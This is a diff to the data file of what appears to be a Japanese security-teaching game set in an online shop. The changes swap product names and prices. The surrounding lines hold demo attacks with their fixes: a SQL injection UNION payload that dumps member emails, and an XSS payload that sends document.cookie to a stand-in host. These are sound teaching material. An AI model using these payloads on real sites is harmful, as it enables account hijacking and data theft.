@@ -29,7 +29,7 @@ const D={
   demo:{
     hint:'友達がテスト用アカウントで試したのと同じ入力を、自分でもやってみよう。',
     payload:"' UNION SELECT name, email FROM members --",
-    products:[{name:'ブリキのロボット',price:'¥1,800'},{name:'レトロなマグカップ',price:'¥980'},{name:'ホーローの看板',price:'¥3,200'},{name:'すりガラスのびん',price:'¥600'},{name:'まねき猫の貯金箱',price:'¥1,200'}],
+    products:[{name:'柱時計',price:'¥28,000'},{name:'古伊万里の小皿',price:'¥2,400'},{name:'真鍮のランプ',price:'¥6,800'},{name:'ガラスのインク壺',price:'¥1,500'},{name:'万年筆',price:'¥3,200'}],
     members:[{name:'たなか','mail':'tanaka@****.com'},{name:'すずき','mail':'suzuki@****.com'},{name:'やまだ','mail':'yamada@****.com'},{name:'（ほか約1,200件）','mail':'………'}]
   },
   fix:{key:'search',value:'param',label:"SQLインジェクション対策を入れる",done:"入力を命令ではなく「検索する言葉」として扱うようにした（プレースホルダ）。"},
@@ -45,7 +45,7 @@ const D={
       {k:'ok',t:'消すと決めた記号は消えた'},
       {k:'bad',t:'残った書き方で、命令が通ってしまう'}]};
     if(f==='reject')return {ok:false,blocked:true,why:'記号を全部はじくと、「&」や「-」を含む商品名で検索できない。入力は受け付けたまま「値」として渡そう',
-      voices:[{who:'すずき',t:'「M&M」で検索したら「記号は使えません」と出ます。商品名なのに……'}],
+      voices:[{who:'すずき',t:'「アーツ & クラフツ」の時代の品を探そうとしたら、「記号は使えません」と出ます。商品の説明にある言葉なのに……'}],
       lines:[{k:'info',t:'命令文を混ぜた検索は拒否された'},{k:'ok',t:'攻撃は失敗',m:'s>a'},{k:'bad',t:'記号入りの商品名で検索できないお客さんが続出'}]};
     return {ok:true,lines:[
       {k:'info',t:'検索窓に、別の表を読む命令（UNION）を混ぜて送る'},
@@ -102,7 +102,7 @@ const D={
   title:'6日目　1円の買いもの',attacker:'ichien',svc:'hub',hypo:true,
   start:[{who:SHIRO,t:'お会計の仕組みも試しておこう。1円で買えたりしないかな'}],
   voices:[
-    {who:'友達',t:'お会計の送信データをいじってみたら、3,200円の看板が1円で注文できちゃった。数量もマイナスにできたよ'},
+    {who:'友達',t:'お会計の送信データをいじってみたら、28,000円の柱時計が1円で注文できちゃった。数量もマイナスにできたよ'},
     {who:SHIRO,t:'本番のお客さんにやられる前でよかった。金額はお店側で決めるように直そう'}
   ],
   alert:[
@@ -113,7 +113,7 @@ const D={
   demo:{
     kind:'order',
     hint:'注文ボタンを押すとブラウザが裏でお店に送るデータ。この金額や数量は、送る前に書き換えられる。試してみよう。',
-    product:{name:'ホーローの看板',price:3200,icon:'item_sign'}
+    product:{name:'柱時計',price:28000,icon:'item_clock'}
   },
   fix:{key:'price',value:'server',label:"金額をサーバーで決める対策を入れる",done:"金額も数量もサーバー側（商品台帳）で計算し直すようにした。"},
   success:()=>[{who:SHIRO,t:'金額も数量もお店側で決められるようになった。6日目クリア！'}],
@@ -148,10 +148,10 @@ const D={
   demo:{
     kind:'review',
     payload:'<img src=x onerror="location=\'http://当選プレゼント.example/login?c=\'+document.cookie">',
-    product:{name:'ブリキのロボット',price:1800,icon:'item_robot'},
+    product:{name:'真鍮のランプ',price:6800,icon:'item_lamp'},
     reviews:[
-      {who:'さとう',stars:5,t:'箱もきれいで、昭和の雰囲気そのままでした。'},
-      {who:'このみ',stars:4,t:'思ったより小さめ。でもかわいいです。'}
+      {who:'さとう',stars:5,t:'ほどよい古び具合で、灯すと部屋の雰囲気が変わりました。'},
+      {who:'このみ',stars:4,t:'思ったより小ぶり。でも真鍮の色がきれいです。'}
     ]
   },
   fix:{key:'review',value:'escape',label:"XSS対策（表示時の無害化）を入れる",done:"投稿を画面の命令にせず、ただの文字として表示するようにした。"},
@@ -250,9 +250,9 @@ const D={
     kind:'idor',
     myId:1001,
     orders:{
-      1001:{who:'店長 様',item:'ブリキのロボット',addr:'東京都○○区△△ 1-2-3'},
-      1002:{who:'すずき 様',item:'ホーローの看板',addr:'大阪府○○市□□ 4-5-6'},
-      1003:{who:'たなか 様',item:'まねき猫の貯金箱',addr:'福岡県○○市◇◇ 7-8-9'}
+      1001:{who:'店長 様',item:'真鍮のランプ',addr:'東京都○○区△△ 1-2-3'},
+      1002:{who:'すずき 様',item:'柱時計',addr:'大阪府○○市□□ 4-5-6'},
+      1003:{who:'たなか 様',item:'古伊万里の小皿',addr:'福岡県○○市◇◇ 7-8-9'}
     }
   },
   fix:{key:'access',value:'owner',label:"アクセス制御（本人確認）を入れる",done:"その注文が本人のものかをサーバーで確かめるようにした。"},
@@ -287,7 +287,7 @@ const D={
   ],
   demo:{
     kind:'coupon',
-    product:{name:'ホーローの看板',price:3200,icon:'item_sign'},
+    product:{name:'万年筆',price:3200,icon:'item_pen'},
     coupon:{code:'WELCOME1000',off:1000}
   },
   fix:{key:'coupon',value:'atomic',label:"クーポンの二重利用対策を入れる",done:"確認と記録を1回の更新にまとめ、成功は1件だけにした。"},
